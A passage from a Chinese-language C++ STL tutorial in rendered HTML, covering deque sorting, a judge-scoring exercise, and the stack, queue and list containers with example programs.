class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>除了用迭代器获取deque容器中元素，[ ]和at也可以</li>
<li>front返回容器第一个元素</li>
<li>back返回容器最后一个元素</li>
</ul>
<h4 id="3-3-7-deque-排序"><a href="#3-3-7-deque-排序" class="headerlink" title="3.3.7  deque 排序"></a>3.3.7  deque 排序</h4><p><strong>功能描述：</strong></p>
<ul>
<li>利用算法实现对deque容器进行排序</li>
</ul>
<p><strong>算法：</strong></p>
<ul>
<li><code>sort(iterator beg, iterator end)</code>  &#x2F;&#x2F;对beg和end区间内元素进行排序</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;deque&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printDeque</span><span class="params">(<span class="type">const</span> deque&lt;<span class="type">int</span>&gt;&amp; d)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (deque&lt;<span class="type">int</span>&gt;::const_iterator it = d.<span class="built_in">begin</span>(); it != d.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	deque&lt;<span class="type">int</span>&gt; d;</span><br><span class="line">	d.<span class="built_in">push_back</span>(<span class="number">10</span>);</span><br><span class="line">	d.<span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	d.<span class="built_in">push_front</span>(<span class="number">100</span>);</span><br><span class="line">	d.<span class="built_in">push_front</span>(<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printDeque</span>(d);</span><br><span class="line">	<span class="built_in">sort</span>(d.<span class="built_in">begin</span>(), d.<span class="built_in">end</span>());</span><br><span class="line">	<span class="built_in">printDeque</span>(d);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：sort算法非常实用，使用时包含头文件 algorithm即可</p>
<h3 id="3-4-案例-评委打分"><a href="#3-4-案例-评委打分" class="headerlink" title="3.4 案例-评委打分"></a>3.4 案例-评委打分</h3><h4 id="3-4-1-案例描述"><a href="#3-4-1-案例描述" class="headerlink" title="3.4.1 案例描述"></a>3.4.1 案例描述</h4><p>有5名选手：选手ABCDE，10个评委分别对每一名选手打分，去除最高分，去除评委中最低分，取平均分。</p>
<h4 id="3-4-2-实现步骤"><a href="#3-4-2-实现步骤" class="headerlink" title="3.4.2 实现步骤"></a>3.4.2 实现步骤</h4><ol>
<li>创建五名选手，放到vector中</li>
<li>遍历vector容器，取出来每一个选手，执行for循环，可以把10个评分打分存到deque容器中</li>
<li>sort算法对deque容器中分数排序，去除最高和最低分</li>
<li>deque容器遍历一遍，累加总分</li>
<li>获取平均分</li>
</ol>
<p><strong>示例代码：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//选手类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(string name, <span class="type">int</span> score)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Name = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Score = score;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	string m_Name; <span class="comment">//姓名</span></span><br><span class="line">	<span class="type">int</span> m_Score;  <span class="comment">//平均分</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">createPerson</span><span class="params">(vector&lt;Person&gt;&amp;v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	string nameSeed = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		string name = <span class="string">&quot;选手&quot;</span>;</span><br><span class="line">		name += nameSeed[i];</span><br><span class="line"></span><br><span class="line">		<span class="type">int</span> score = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="function">Person <span class="title">p</span><span class="params">(name, score)</span></span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//将创建的person对象 放入到容器中</span></span><br><span class="line">		v.<span class="built_in">push_back</span>(p);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打分</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setScore</span><span class="params">(vector&lt;Person&gt;&amp;v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (vector&lt;Person&gt;::iterator it = v.<span class="built_in">begin</span>(); it != v.<span class="built_in">end</span>(); it++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//将评委的分数 放入到deque容器中</span></span><br><span class="line">		deque&lt;<span class="type">int</span>&gt;d;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">int</span> score = <span class="built_in">rand</span>() % <span class="number">41</span> + <span class="number">60</span>;  <span class="comment">// 60 ~ 100</span></span><br><span class="line">			d.<span class="built_in">push_back</span>(score);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//cout &lt;&lt; &quot;选手： &quot; &lt;&lt; it-&gt;m_Name &lt;&lt; &quot; 打分： &quot; &lt;&lt; endl;</span></span><br><span class="line">		<span class="comment">//for (deque&lt;int&gt;::iterator dit = d.begin(); dit != d.end(); dit++)</span></span><br><span class="line">		<span class="comment">//&#123;</span></span><br><span class="line">		<span class="comment">//	cout &lt;&lt; *dit &lt;&lt; &quot; &quot;;</span></span><br><span class="line">		<span class="comment">//&#125;</span></span><br><span class="line">		<span class="comment">//cout &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//排序</span></span><br><span class="line">		<span class="built_in">sort</span>(d.<span class="built_in">begin</span>(), d.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">		<span class="comment">//去除最高和最低分</span></span><br><span class="line">		d.<span class="built_in">pop_back</span>();</span><br><span class="line">		d.<span class="built_in">pop_front</span>();</span><br><span class="line"></span><br><span class="line">		<span class="comment">//取平均分</span></span><br><span class="line">		<span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (deque&lt;<span class="type">int</span>&gt;::iterator dit = d.<span class="built_in">begin</span>(); dit != d.<span class="built_in">end</span>(); dit++)</span><br><span class="line">		&#123;</span><br><span class="line">			sum += *dit; <span class="comment">//累加每个评委的分数</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="type">int</span> avg = sum / d.<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">		<span class="comment">//将平均分 赋值给选手身上</span></span><br><span class="line">		it-&gt;m_Score = avg;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">showScore</span><span class="params">(vector&lt;Person&gt;&amp;v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (vector&lt;Person&gt;::iterator it = v.<span class="built_in">begin</span>(); it != v.<span class="built_in">end</span>(); it++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;姓名： &quot;</span> &lt;&lt; it-&gt;m_Name &lt;&lt; <span class="string">&quot; 平均分： &quot;</span> &lt;&lt; it-&gt;m_Score &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//随机数种子</span></span><br><span class="line">	<span class="built_in">srand</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//1、创建5名选手</span></span><br><span class="line">	vector&lt;Person&gt;v;  <span class="comment">//存放选手容器</span></span><br><span class="line">	<span class="built_in">createPerson</span>(v);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//测试</span></span><br><span class="line">	<span class="comment">//for (vector&lt;Person&gt;::iterator it = v.begin(); it != v.end(); it++)</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	cout &lt;&lt; &quot;姓名： &quot; &lt;&lt; (*it).m_Name &lt;&lt; &quot; 分数： &quot; &lt;&lt; (*it).m_Score &lt;&lt; endl;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、给5名选手打分</span></span><br><span class="line">	<span class="built_in">setScore</span>(v);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//3、显示最后得分</span></span><br><span class="line">	<span class="built_in">showScore</span>(v);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong> 选取不同的容器操作数据，可以提升代码的效率</p>
<h3 id="3-5-stack容器"><a href="#3-5-stack容器" class="headerlink" title="3.5 stack容器"></a>3.5 stack容器</h3><h4 id="3-5-1-stack-基本概念"><a href="#3-5-1-stack-基本概念" class="headerlink" title="3.5.1 stack 基本概念"></a>3.5.1 stack 基本概念</h4><p><strong>概念：</strong>stack是一种<strong>先进后出</strong>(First In Last Out,FILO)的数据结构，它只有一个出口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/C++%E6%8F%90%E9%AB%98%E7%BC%96%E7%A8%8B/clip_image002-1547604555425.jpg"
                      alt="说明: 2015-11-15_195707"
                ></p>
<p>栈中只有顶端的元素才可以被外界使用，因此栈不允许有遍历行为</p>
<p>栈中进入数据称为  — <strong>入栈</strong>  <code>push</code></p>
<p>栈中弹出数据称为  — <strong>出栈</strong>  <code>pop</code></p>
<p>生活中的栈：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/C++%E6%8F%90%E9%AB%98%E7%BC%96%E7%A8%8B/clip_image002.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/C++%E6%8F%90%E9%AB%98%E7%BC%96%E7%A8%8B/clip_image002-1547605111510.jpg"
                      alt="img"
                ></p>
<h4 id="3-5-2-stack-常用接口"><a href="#3-5-2-stack-常用接口" class="headerlink" title="3.5.2 stack 常用接口"></a>3.5.2 stack 常用接口</h4><p>功能描述：栈容器常用的对外接口</p>
<p>构造函数：</p>
<ul>
<li><code>stack&lt;T&gt; stk;</code>                                 &#x2F;&#x2F;stack采用模板类实现， stack对象的默认构造形式</li>
<li><code>stack(const stack &amp;stk);</code>            &#x2F;&#x2F;拷贝构造函数</li>
</ul>
<p>赋值操作：</p>
<ul>
<li><code>stack&amp; operator=(const stack &amp;stk);</code>           &#x2F;&#x2F;重载等号操作符</li>
</ul>
<p>数据存取：</p>
<ul>
<li><code>push(elem);</code>      &#x2F;&#x2F;向栈顶添加元素</li>
<li><code>pop();</code>                &#x2F;&#x2F;从栈顶移除第一个元素</li>
<li><code>top(); </code>                &#x2F;&#x2F;返回栈顶元素</li>
</ul>
<p>大小操作：</p>
<ul>
<li><code>empty();</code>            &#x2F;&#x2F;判断堆栈是否为空</li>
<li><code>size(); </code>              &#x2F;&#x2F;返回栈的大小</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//栈容器常用接口</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//创建栈容器 栈容器必须符合先进后出</span></span><br><span class="line">	stack&lt;<span class="type">int</span>&gt; s;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//向栈中添加元素，叫做 压栈 入栈</span></span><br><span class="line">	s.<span class="built_in">push</span>(<span class="number">10</span>);</span><br><span class="line">	s.<span class="built_in">push</span>(<span class="number">20</span>);</span><br><span class="line">	s.<span class="built_in">push</span>(<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (!s.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">		<span class="comment">//输出栈顶元素</span></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;栈顶元素为： &quot;</span> &lt;&lt; s.<span class="built_in">top</span>() &lt;&lt; endl;</span><br><span class="line">		<span class="comment">//弹出栈顶元素</span></span><br><span class="line">		s.<span class="built_in">pop</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;栈的大小为：&quot;</span> &lt;&lt; s.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>入栈   — push</li>
<li>出栈   — pop</li>
<li>返回栈顶   — top</li>
<li>判断栈是否为空   — empty</li>
<li>返回栈大小   — size</li>
</ul>
<h3 id="3-6-queue-容器"><a href="#3-6-queue-容器" class="headerlink" title="3.6 queue 容器"></a>3.6 queue 容器</h3><h4 id="3-6-1-queue-基本概念"><a href="#3-6-1-queue-基本概念" class="headerlink" title="3.6.1 queue 基本概念"></a>3.6.1 queue 基本概念</h4><p><strong>概念：</strong>Queue是一种<strong>先进先出</strong>(First In First Out,FIFO)的数据结构，它有两个出口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/C++%E6%8F%90%E9%AB%98%E7%BC%96%E7%A8%8B/clip_image002-1547606475892.jpg"
                      alt="说明: 2015-11-15_214429"
                ></p>
<p>队列容器允许从一端新增元素，从另一端移除元素</p>
<p>队列中只有队头和队尾才可以被外界使用，因此队列不允许有遍历行为</p>
<p>队列中进数据称为 — <strong>入队</strong>    <code>push</code></p>
<p>队列中出数据称为 — <strong>出队</strong>    <code>pop</code></p>
<p>生活中的队列：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/C++%E6%8F%90%E9%AB%98%E7%BC%96%E7%A8%8B/1547606785041.png"
                      alt="1547606785041"
                ></p>
<h4 id="3-6-2-queue-常用接口"><a href="#3-6-2-queue-常用接口" class="headerlink" title="3.6.2 queue 常用接口"></a>3.6.2 queue 常用接口</h4><p>功能描述：栈容器常用的对外接口</p>
<p>构造函数：</p>
<ul>
<li><code>queue&lt;T&gt; que;</code>                                 &#x2F;&#x2F;queue采用模板类实现，queue对象的默认构造形式</li>
<li><code>queue(const queue &amp;que);</code>            &#x2F;&#x2F;拷贝构造函数</li>
</ul>
<p>赋值操作：</p>
<ul>
<li><code>queue&amp; operator=(const queue &amp;que);</code>           &#x2F;&#x2F;重载等号操作符</li>
</ul>
<p>数据存取：</p>
<ul>
<li><code>push(elem);</code>                             &#x2F;&#x2F;往队尾添加元素</li>
<li><code>pop();</code>                                      &#x2F;&#x2F;从队头移除第一个元素</li>
<li><code>back();</code>                                    &#x2F;&#x2F;返回最后一个元素</li>
<li><code>front(); </code>                                  &#x2F;&#x2F;返回第一个元素</li>
</ul>
<p>大小操作：</p>
<ul>
<li><code>empty();</code>            &#x2F;&#x2F;判断堆栈是否为空</li>
<li><code>size(); </code>              &#x2F;&#x2F;返回栈的大小</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(string name, <span class="type">int</span> age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Name = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	string m_Name;</span><br><span class="line">	<span class="type">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建队列</span></span><br><span class="line">	queue&lt;Person&gt; q;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//准备数据</span></span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="string">&quot;唐僧&quot;</span>, <span class="number">30</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(<span class="string">&quot;孙悟空&quot;</span>, <span class="number">1000</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p3</span><span class="params">(<span class="string">&quot;猪八戒&quot;</span>, <span class="number">900</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p4</span><span class="params">(<span class="string">&quot;沙僧&quot;</span>, <span class="number">800</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//向队列中添加元素  入队操作</span></span><br><span class="line">	q.<span class="built_in">push</span>(p1);</span><br><span class="line">	q.<span class="built_in">push</span>(p2);</span><br><span class="line">	q.<span class="built_in">push</span>(p3);</span><br><span class="line">	q.<span class="built_in">push</span>(p4);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//队列不提供迭代器，更不支持随机访问	</span></span><br><span class="line">	<span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">		<span class="comment">//输出队头元素</span></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;队头元素-- 姓名： &quot;</span> &lt;&lt; q.<span class="built_in">front</span>().m_Name </span><br><span class="line">              &lt;&lt; <span class="string">&quot; 年龄： &quot;</span>&lt;&lt; q.<span class="built_in">front</span>().m_Age &lt;&lt; endl;</span><br><span class="line">        </span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;队尾元素-- 姓名： &quot;</span> &lt;&lt; q.<span class="built_in">back</span>().m_Name  </span><br><span class="line">              &lt;&lt; <span class="string">&quot; 年龄： &quot;</span> &lt;&lt; q.<span class="built_in">back</span>().m_Age &lt;&lt; endl;</span><br><span class="line">        </span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">		<span class="comment">//弹出队头元素</span></span><br><span class="line">		q.<span class="built_in">pop</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;队列大小为：&quot;</span> &lt;&lt; q.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>入队   — push</li>
<li>出队   — pop</li>
<li>返回队头元素   — front</li>
<li>返回队尾元素   — back</li>
<li>判断队是否为空   — empty</li>
<li>返回队列大小   — size</li>
</ul>
<h3 id="3-7-list容器"><a href="#3-7-list容器" class="headerlink" title="3.7 list容器"></a>3.7 list容器</h3><h4 id="3-7-1-list基本概念"><a href="#3-7-1-list基本概念" class="headerlink" title="3.7.1 list基本概念"></a>3.7.1 list基本概念</h4><p><strong>功能：</strong>将数据进行链式存储</p>
<p><strong>链表</strong>（list）是一种物理存储单元上非连续的存储结构，数据元素的逻辑顺序是通过链表中的指针链接实现的</p>
<p>链表的组成：链表由一系列<strong>结点</strong>组成</p>
<p>结点的组成：一个是存储数据元素的<strong>数据域</strong>，另一个是存储下一个结点地址的<strong>指针域</strong></p>
<p>STL中的链表是一个双向循环链表</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/C++%E6%8F%90%E9%AB%98%E7%BC%96%E7%A8%8B/clip_image002-1547608564071.jpg"
                      alt="说明: 2015-11-15_225145"
                ></p>
<p>由于链表的存储方式并不是连续的内存空间，因此链表list中的迭代器只支持前移和后移，属于<strong>双向迭代器</strong></p>
<p>list的优点：</p>
<ul>
<li>采用动态存储分配，不会造成内存浪费和溢出</li>
<li>链表执行插入和删除操作十分方便，修改指针即可，不需要移动大量元素</li>
</ul>
<p>list的缺点：</p>
<ul>
<li>链表灵活，但是空间(指针域) 和 时间（遍历）额外耗费较大</li>
</ul>
<p>List有一个重要的性质，插入操作和删除操作都不会造成原有list迭代器的失效，这在vector是不成立的。</p>
<p>总结：STL中<strong>List和vector是两个最常被使用的容器</strong>，各有优缺点</p>
<h4 id="3-7-2-list构造函数"><a href="#3-7-2-list构造函数" class="headerlink" title="3.7.2  list构造函数"></a>3.7.2  list构造函数</h4><p><strong>功能描述：</strong></p>
<ul>
<li>创建list容器</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>list&lt;T&gt; lst;</code>                               &#x2F;&#x2F;list采用采用模板类实现,对象的默认构造形式：</li>
<li><code>list(beg,end);</code>                           &#x2F;&#x2F;构造函数将[beg, end)区间中的元素拷贝给本身。</li>
<li><code>list(n,elem);</code>                             &#x2F;&#x2F;构造函数将n个elem拷贝给本身。</li>
<li><code>list(const list &amp;lst);</code>            &#x2F;&#x2F;拷贝构造函数。</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printList</span><span class="params">(<span class="type">const</span> list&lt;<span class="type">int</span>&gt;&amp; L)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (list&lt;<span class="type">int</span>&gt;::const_iterator it = L.<span class="built_in">begin</span>(); it != L.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	list&lt;<span class="type">int</span>&gt;L1;</span><br><span class="line">	L<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">10</span>);</span><br><span class="line">	L<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	L<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">30</span>);</span><br><span class="line">	L<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printList</span>(L1);</span><br><span class="line"></span><br><span class="line">	list&lt;<span class="type">int</span>&gt;<span class="built_in">L2</span>(L<span class="number">1.</span><span class="built_in">begin</span>(),L<span class="number">1.</span><span class="built_in">end</span>());</span><br><span class="line">	<span class="built_in">printList</span>(L2);</span><br><span class="line"></span><br><span class="line">	list&lt;<span class="type">int</span>&gt;<span class="built_in">L3</span>(L2);</span><br><span class="line">	<span class="built_in">printList</span>(L3);</span><br><span class="line"></span><br><span class="line">	list&lt;<span class="type">int</span>&gt;<span class="built_in">L4</span>(<span class="number">10</span>, <span class="number">1000</span>);</span><br><span class="line">	<span class="built_in">printList</span>(L4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：list构造方式同其他几个STL常用容器，熟练掌握即可</p>
<h4 id="3-7-3-list-赋值和交换"><a href="#3-7-3-list-赋值和交换" class="headerlink" title="3.7.3 list 赋值和交换"></a>3.7.3 list 赋值和交换</h4><p><strong>功能描述：</strong></p>
<ul>
<li>给list容器进行赋值，以及交换list容器</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>assign(beg, end);</code>            &#x2F;&#x2F;将[beg, end)区间中的数据拷贝赋值给本身。</li>
<li><code>assign(n, elem);</code>              &#x2F;&#x2F;将n个elem拷贝赋值给本身。</li>
<li><code>list&amp; operator=(const list &amp;lst);</code>         &#x2F;&#x2F;重载等号操作符</li>
<li><code>swap(lst);</code>                         &#x2F;&#x2F;将lst与本身的元素互换。</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printList</span><span class="params">(<span class="type">const</span> list&lt;<span class="type">int</span>&gt;&amp; L)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (list&lt;<span class="type">int</span>&gt;::const_iterator it = L.<span class="built_in">begin</span>(); it != L.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//赋值和交换</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	list&lt;<span class="type">int</span>&gt;L1;</span><br><span class="line">	L<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">10</span>);</span><br><span class="line">	L<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	L<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">30</span>);</span><br><span class="line">	L<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">40</span>);</span><br><span class="line">	<span class="built_in">printList</span>(L1);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//赋值</span></span><br><span class="line">	list&lt;<span class="type">int</span>&gt;L2;</span><br><span class="line">	L2 = L1;</span><br><span class="line">	<span class="built_in">printList</span>(L2);</span><br><span class="line"></span><br><span class="line">	list&lt;<span class="type">int</span>&gt;L3;</span><br><span class="line">	L<span class="number">3.</span><span class="built_in">assign</span>(L<span class="number">2.</span><span class="built_in">begin</span>(), L<span class="number">2.</span><span class="built_in">end</span>());</span><br><span class="line">	<span class="built_in">printList</span>(L3);</span><br><span class="line"></span><br><span class="line">	list&lt;<span class="type">int</span>&gt;L4;</span><br><span class="line">	L<span class="number">4.</span><span class="built_in">assign</span>(<span class="number">10</span>, <span class="number">100</span>);</span><br><span class="line">	<span class="built_in">printList</span>(L4);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//交换</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span 